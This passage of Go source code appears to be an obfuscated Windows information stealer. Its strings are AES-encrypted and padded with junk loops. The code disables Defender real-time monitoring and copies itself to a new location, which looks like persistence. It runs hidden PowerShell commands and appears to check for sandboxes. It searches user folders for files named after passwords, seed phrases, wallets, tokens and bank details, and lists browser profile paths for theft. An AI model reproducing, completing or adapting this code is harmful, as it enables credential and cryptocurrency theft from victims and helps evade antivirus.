				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	args2 := Cijosgmviuhoepbatohaaytukfezbopl("a4050b3aa3ec98aa35efcb2b1e988aa16cbc722b029948b6ac5aa5f54c482a58873d0fa83dd11647b4")
	output, err := ulkqmtusdhntfbcginmwvzjwjcdiodtq(args2)
	if err != nil {
	}

	settings := []string{
		"DisableRealtimeMonitoring",
	}
	commands := map[string]string{
		"DisableRealtimeMonitoring": "Set-MpPreference -DisableRealtimeMonitoring $true",
	}
	for _, setting := range settings {
		if strings.Contains(output, setting) && strings.Contains(output, Cijosgmviuhoepbatohaaytukfezbopl("a50113648bff9c9be9527795aec674d8fdbe343ffd")) {
			if command, exists := commands[setting]; exists {
				ulkqmtusdhntfbcginmwvzjwjcdiodtq(command)
			}
		}
	}

}

func ebkgkvbgsnngcfzknhtzjmqthvbmaifa() (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	currentPath, err := os.Executable()
	if err != nil {
	}
	destinationPath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("90141e659ae9b8f635f1cbf6a6b488273ea1f8eeb6ad6019cc353b"))
	sourceFile, err := os.Open(currentPath)
	if err != nil {
	}
	defer sourceFile.Close()
	destFile, err := os.Create(destinationPath)
	if err != nil {
	}
	defer destFile.Close()
	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
	}

	return destinationPath, nil
}

func yabijnfpufhdoajacjzcgqghwvwwuooi(exePath string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	command := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("b0141e659ab198aa3feacb2a08d6ceb423e6613c039342a9a51aa97f40dbfa8f249c52d089673e4a872b7755f23bb8fced70f0fd66d21f94b2ce9770db40c78028134dfbcde22db41404a66120f38f7244d5a7dd2df0fe8029ff1d63d1ccabec9ca0a219311ee2dc77699f9ea4b5117c553f44320e838f29dc3fa30c856179769d3dd169a278d43fe82bf7de3947eb12fb18ea0496a68f9a7da0e66677b024"), exePath)
	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce23107a83fda6bc495a19ac3d936b6eedc4927b79d6741e"), command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	if err != nil {

	}

	return nil
}
func Cijosgmviuhoepbatohaaytukfezbopl(s string) string {
	key,
		_ := hex.
		DecodeString("ad4a42b4642865474a8607c4790de43ddaae59cbcc5a0880d19b26e815c3e9f8")
	ciphertext,
		_ := hex.DecodeString(s)
	nonce,
		_ := hex.DecodeString("498734701d5cb3b167a8646e")
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(
			err.Error())
	}
	aesgcm, err :=
		cipher.NewGCM(block)
	if err !=
		nil {
		panic(err.Error())
	}
	plaintext,
		err := aesgcm.
		Open(nil, nonce, ciphertext,
			nil)
	if err != nil {
		panic(err.Error())
	}
	return string(plaintext)
}

func main() {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	ipInfo, err := txirwxpjjwojtqzabcifdhngtrhevxhy()
	if err != nil {
		return
	}
	if ktkxgocrlhofmcfcpebfgtjpyrbwjzoe(ipInfo["ip"].(string)) ||
		vcxfecqxpyqofmsqjgdapmnjszzjdifl() ||
		scowquqytwhwdkeucyvajwuqnmwblzkr() ||
		qpgcpqfiqbynjtxszlphdupluxenmgro() ||
		bgaqazdnphynjlmqitlfrmaukzhwhhsb() ||
		fctkiyeadztlkkzkremdzrhfiqjwlmai() {

	}

	configJSON := Cijosgmviuhoepbatohaaytukfezbopl("98422f7697f0a7b934cadc200b828ca013e4762252c105e7e51fe23778f6f99f2a8b45d4b12c771c973f3300f42ae0afb967d9d510b620f1e99b823e981e808800164beed0f02f8d14379a6d20b5da2715a5c6eb37e3efb134cd5a2b8087e8a0b582bb187055cb89487cfcd4f6f40f60443e57191f85bf5f9c39d76b94716b26cb0fb131f94fdc07eb45f2fd3964c019c34ef4122c81bf0293c1a705c318d86a20030dab30fddb133a86e98ed4e5730df74936160503324c0089adddcd3be9036a7cdbcfc1aec42be1d243321aaeb01308e5ceda25c62ff66c5ffacd8b96dd95de97a8b1c0fff6677b26850b3584c765dd33ad42471016add72e784bcdc31c3d639cc18e31358dda61f7e08f556fcad33ae5bbf00359d143451e76203b0adf14cd82e04cd3b145549a42e04ff640")
	var config Config
	if err := json.Unmarshal([]byte(configJSON), &config); err != nil {
		return
	}
	hostname, err := yuahgibmtysvdsjbmgfzzhuadxqfnsky()
	if err != nil {
		return
	}

	pcType, err := xitkregjmufazcgmrndkoppvsuimfvxp()
	if err != nil {
		return
	}
	mac, err := wtizxeazdewjatblfycmoxdqavoqpgsi()
	if err != nil {
		log.Fatalf(Cijosgmviuhoepbatohaaytukfezbopl("a6120d789ca6e8fd26d6e5727006e6e73c040be389066dda59"), err)
	}
	arch := hfuhbaosozeaxoxcbnwrkovegztcfxot()
	filePath := qukwtayjhqzwebfdirhfphbahmydsmcj()
	mainPath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb7bcff89bb28c56053d5603c207d13801"))

	allowedExtensions := []string{"rdp", "txt", "doc", "docx", "pdf", "csv", "xls", "xlsx", "keys", "ldb", "log"}
	foldersToSearch := []string{"Documents", "Desktop", "Downloads"}
	files := []string{"secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"}
	browserPaths := [][]string{
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a6032659985c48f4b5432ac2ff2c96e45f")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699994fe63468c5f8da78a5b3ae0b821590cc8e647d7e0fa1d9b274")), "Profile_1", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699994fe63468c5f8da7ba5d029c12797b94434457280069400f9a7")), "Profile_2", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699994fe63468c5f8da7aa54f548744e9a1c3a25a77d5fe78b7c0e9")), "Profile_3", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699994fe63468c5f8da7da51726546c93ea5540076d7c14ffb26e01")), "Profile_4", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699994fe63468c5f8da7ca5885b120fedf2d2d6186829ec1305574f")), "Profile_5", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f4699fabfd428942f9a30ca5887c409180f83"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a452095bc16d705ce147ab966924e7f5742acfc6c2c067ff8410")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4521d4cc86a6c5cf03be8c4e38be00fd4a9377948b559ff9822bdd7")), "Profile_1", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4521d4cc86a6c5cf03bebc47f4088bca971faf0a9c6a9d7967b3850")), "Profile_2", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4521d4cc86a6c5cf03beac40b0650d27dc641880917f9cf93b3bb2d")), "Profile_3", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4521d4cc86a6c5cf03bedc484d659da52c061e36b2149878ac8335f")), "Profile_4", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4521d4cc86a6c5cf03becc4f09081b48677da9bcbf0199f8f00b022")), "Profile_5", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4520a4bc27f7110c569b6fee03cddea3ff8b3dc1193121357efbeb090b2f41b")), "Guest Profile", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a1121e618bcfa7be24fecf2b1eaaabb62de76163328948b2ba58fb0e54daf88869bd5dd0a4528fdddbf215008dc7b41c5006bbfd386f"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1be2c9f5dd1a97a11ecf8ecb564602d2f35f2c227bd56f2af")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1aa3b965acda96b6d0ffbd244bf6a24e668e3560f7f6dc789f560")), "Profile_1", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1aa3b965acda96b6d0cfbd9a5cc9a0ce83166d1c5daefee014f41")), "Profile_2", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1aa3b965acda96b6d0dfbdf051dca14edf9e5ac83b991f686d95e")), "Profile_3", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1aa3b965acda96b6d0afbce672b7a5cf4826dde5091ebbd103b03")), "Profile_4", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1aa3b965acda96b6d0bfbc8c7fa2a44f14aeea316f295a597ad1c")), "Profile_5", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1bd3c9c4fd0e55e3f51c1656955c9f496a4e429228da96c2a06ab193f0b34")), "Guest Profile", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ba0111738be4948131e7ca3c03b49bab3be2613c2cae54a0bb1dcd3375c8c1cfb4475cc1dd2569a7b29b9be075e80e"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49579ec3460dcf18e159a61bc9791dc853b6cb97efc22b48ddf")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4956dfb3d67c0f19f69c860b4f3484381aeb13887939216964af749")), "Profile_1", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4956dfb3d67c0f19f69cb603b76cf89242c98b03db29de89f7f2e02")), "Profile_2", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4956dfb3d67c0f19f69ca6041f5b2cf47528037abad98bd6793993b")), "Profile_3", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4956dfb3d67c0f19f69cd60e67dc01c6f28cba149f082148d149c95")), "Profile_4", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
